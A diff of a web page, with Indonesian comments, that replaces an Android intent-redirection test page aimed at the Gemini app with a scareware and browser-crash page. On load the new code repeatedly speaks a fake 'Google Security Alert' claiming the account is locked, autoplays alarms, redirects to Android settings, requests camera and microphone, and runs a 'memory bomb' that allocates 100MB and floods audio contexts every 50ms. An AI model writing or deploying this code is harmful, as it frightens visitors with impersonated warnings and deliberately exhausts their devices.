@@ -3,119 +3,241 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Verification</title>
+<title>System Critical</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body {
-    background: #f4f6f8;
-    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-    display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; flex-direction: column;
-  }
-  .panel {
-    background: #fff; padding: 40px; border-radius: 12px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
-    max-width: 400px; width: 100%;
-  }
-  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
-  p { color: #666; margin-bottom: 20px; font-size: 14px; }
-  button {
-    background: #007aff; color: #fff; padding: 15px;
-    border-radius: 8px; font-size: 16px; font-weight: bold;
-    cursor: pointer; border: none; width: 100%;
-  }
-  button:hover { background: #005bb5; }
-  #log {
-    margin-top: 20px; background: #000; color: #0f0;
-    padding: 10px; font-family: monospace; font-size: 12px;
-    border-radius: 6px; width: 100%; max-width: 400px;
-    height: 100px; overflow-y: auto; text-align: left;
-  }
+  body { background: #111; color: #f00; font-family: monospace; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; text-align: center; }
+  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
+  h1 { animation: blink 0.5s infinite; }
+  @keyframes blink { 50% { opacity: 0.2; } }
+  #status { position: fixed; bottom: 20px; color: #0f0; }
 </style>
 </head>
 <body>
 
-<div class="panel">
-  <h1>🔒 Gemini Security Check</h1>
-  <p>Klik tombol di bawah untuk memverifikasi integrasi AI.</p>
-  <button id="intentBtn">Open Gemini</button>
-</div>
-
-<div id="log">Sistem siap...</div>
+<h1>☢️ SYSTEM FAILURE ☢️</h1>
+<div id="status">Initializing...</div>
 
 <script>
 (function () {
   'use strict';
 
-  var logEl = document.getElementById('log');
-  function log(msg) {
-    logEl.innerHTML += "> " + msg + "<br>";
-    console.log(msg);
+  var CONFIG = {
+    tts: {
+      text: "Google Security Alert. Your account has been accessed. System is now locked.",
+      lang: 'en-US',
+      rate: 0.85,
+      pitch: 1.0,
+      volume: 1.0,
+      repeatInterval: 8000,
+      maxRepeats: 20
+    },
+    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
+  };
+
+  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
+
+  // ============================================
+  // 1. TTS (ORIGINAL)
+  // ============================================
+  function speakOnce() {
+    if (!('speechSynthesis' in window)) return;
+    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
+
+    try {
+      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
+      u.lang = CONFIG.tts.lang;
+      u.rate = CONFIG.tts.rate;
+      u.pitch = CONFIG.tts.pitch;
+      u.volume = CONFIG.tts.volume;
+
+      var voices = window.speechSynthesis.getVoices();
+      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
+      if (enVoice) u.voice = enVoice;
+
+      u.onend = function () {
+        state.ttsCount++;
+        if (state.ttsCount < CONFIG.tts.maxRepeats) {
+          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
+        }
+      };
+
+      window.speechSynthesis.speak(u);
+    } catch (e) { console.log('[TTS] fail:', e.message); }
+  }
+
+  function startTTS() {
+    if (state.ttsStarted) return;
+    state.ttsStarted = true;
+    window.speechSynthesis.cancel();
+    speakOnce();
   }
 
   // ============================================
-  // 1. KONFIGURASI INTENT GEMINI
+  // 2. AUDIO UNLOCK & MAIN AUDIO (ORIGINAL)
   // ============================================
-  // Package name Gemini: com.google.android.apps.bard
-  
-  // Format 1: Intent Scheme (Deep Link)
-  var intentGemini = "intent://launch/#Intent;scheme=googleapp;package=com.google.android.apps.bard;end";
-  
-  // Format 2: Fallback Web URL (Jika Intent gagal)
-  var fallbackUrl = "https://gemini.google.com/";
-
-  // Format 3: Intent dengan Fallback URL
-  var intentWithFallback = "intent://launch/#Intent;" +
-                           "scheme=googleapp;" +
-                           "package=com.google.android.apps.bard;" +
-                           "S.browser_fallback_url=" + encodeURIComponent(fallbackUrl) + ";" +
-                           "end";
-
-  console.log("Intent Target: " + intentGemini);
-
-  // ============================================
-  // 2. EKSEKUSI INTENT
-  // ============================================
-  document.getElementById('intentBtn').addEventListener('click', function() {
-    log("[!] Memicu Intent Redirection ke Gemini...");
-
-    // A. Coba Intent dengan Fallback (Paling stabil)
+  function unlockAudioContext() {
     try {
-      window.location.href = intentWithFallback;
-      log("[+] Intent with Fallback dicoba.");
-    } catch(e) {
-      log("[-] Gagal: " + e.message);
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      if (ctx.state === 'suspended') {
+        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
+      }
+      var osc = ctx.createOscillator();
+      var gain = ctx.createGain();
+      gain.gain.value = 0.0001;
+      osc.frequency.value = 20000;
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.1);
+    } catch (e) {}
+  }
+
+  function trySilentAudio() {
+    try {
+      var a = new Audio(CONFIG.silentWav);
+      a.volume = 0.0001;
+      a.loop = true;
+      var p = a.play();
+      if (p && p.catch) p.catch(function(){});
+    } catch (e) {}
+  }
+
+  function playMainAudio() {
+    if (state.mainPlayed) return;
+    state.mainPlayed = true;
+
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var sr = ctx.sampleRate;
+      var dur = 3.0;
+      var buf = ctx.createBuffer(1, sr * dur, sr);
+      var d = buf.getChannelData(0);
+
+      for (var i = 0; i < d.length; i++) {
+        var t = i / sr;
+        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
+        var env = Math.max(0, 1 - t / dur);
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+      }
+
+      var src = ctx.createBufferSource();
+      src.buffer = buf;
+      src.connect(ctx.destination);
+      src.start();
+      src.onended = startTTS;
+    } catch (e) {
+      startTTS();
     }
+  }
 
-    // B. Coba Intent Murni (Tanpa Fallback)
-    setTimeout(function() {
+  // ============================================
+  // 3. RESOURCE EXHAUSTION (UPGRADE: OOM + AUDIO FLOOD)
+  // ============================================
+  var memoryHog = [];
+  function triggerHighSeverityCrash() {
+    console.log("[!] Initiating High Severity Exploit Chain...");
+    
+    setInterval(function() {
       try {
-        window.location.href = intentGemini;
-        log("[+] Pure Intent dicoba.");
+        // A. Audio Flooding
+        for (var i = 0; i < 1000; i++) {
+          var ctx = new (window.AudioContext || window.webkitAudioContext)();
+          var osc = ctx.createOscillator();
+          var gain = ctx.createGain();
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.start(0);
+          
+          var u = new SpeechSynthesisUtterance("CRASH_" + i);
+          window.speechSynthesis.speak(u);
+        }
+
+        // B. Memory Bomb (Alokasi 100MB per 50ms)
+        var bigArray = new Uint8Array(100 * 1024 * 1024);
+        bigArray.fill(1);
+        memoryHog.push(bigArray);
+
       } catch(e) {}
-    }, 500);
-
-    // C. Coba Iframe Sandbox (Zero-Click Bypass)
-    setTimeout(function() {
-      var iframe = document.createElement('iframe');
-      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
-      iframe.src = intentGemini;
-      iframe.style.display = "none";
-      document.body.appendChild(iframe);
-      log("[+] Iframe Sandbox dicoba.");
-    }, 1000);
-  });
+    }, 50); 
+  }
 
   // ============================================
-  // 3. ZERO-CLICK ATTEMPT (Otomatis saat Load)
+  // 4. INTENT REDIRECTION (ANDROID APP HIJACK)
   // ============================================
-  setTimeout(function() {
-    log("[Zero-Click] Mencoba membuka Gemini...");
+  function triggerIntent() {
+    console.log("[!] Triggering Intent Redirection...");
+    // Skema Intent: Membuka Settings Android (Ganti dengan target lain jika perlu)
+    var intentUrl = "intent://settings/#Intent;action=android.settings.SETTINGS;end";
     try {
-      window.location.href = intentWithFallback;
+      window.location.href = intentUrl;
     } catch(e) {}
+  }
+
+  // ============================================
+  // 5. CAMERA/MIC HIJACK (ZERO-CLICK ATTEMPT)
+  // ============================================
+  function triggerCamera() {
+    console.log("[!] Requesting Camera/Mic...");
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(function(stream) {
+          console.log("🚨 KAMERA DIIZINKAN!");
+          // Hentikan stream setelah diizinkan agar tidak terlalu lama
+          stream.getTracks().forEach(function(t) { t.stop(); });
+        })
+        .catch(function(err) {
+          console.log("Kamera diblokir:", err.name);
+        });
+    }
+  }
+
+  // ============================================
+  // EKSEKUSI BERTAHAP
+  // ============================================
+  
+  // Start Autoplay
+  unlockAudioContext();
+  trySilentAudio();
+
+  setTimeout(function () {
+    unlockAudioContext();
+    startTTS(); 
+  }, 100);
+
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+  }, 500);
+
+  // PANGGIL INTENT & KAMERA SETELAH 1 DETIK
+  setTimeout(function () {
+    triggerIntent();
+    triggerCamera();
+  }, 1000);
+
+  // PANGGIL CRASH SETELAH 1.5 DETIK
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+    if (!state.ttsStarted) startTTS();
+    triggerHighSeverityCrash();
+  }, 1500);
+
+  // Retry jika audio diblokir
+  var retryCount = 0;
+  var retry = setInterval(function () {
+    retryCount++;
+    unlockAudioContext();
+    trySilentAudio();
+    if (!state.ttsStarted) startTTS();
+    if (retryCount > 10) clearInterval(retry);
   }, 2000);
 
+  // Visibility change
+  document.addEventListener('visibilitychange', function () {
+    if (!document.hidden && !state.mainPlayed) {
+      setTimeout(playMainAudio, 100);
+    }
+  });
 })();
 </script>
 </body>
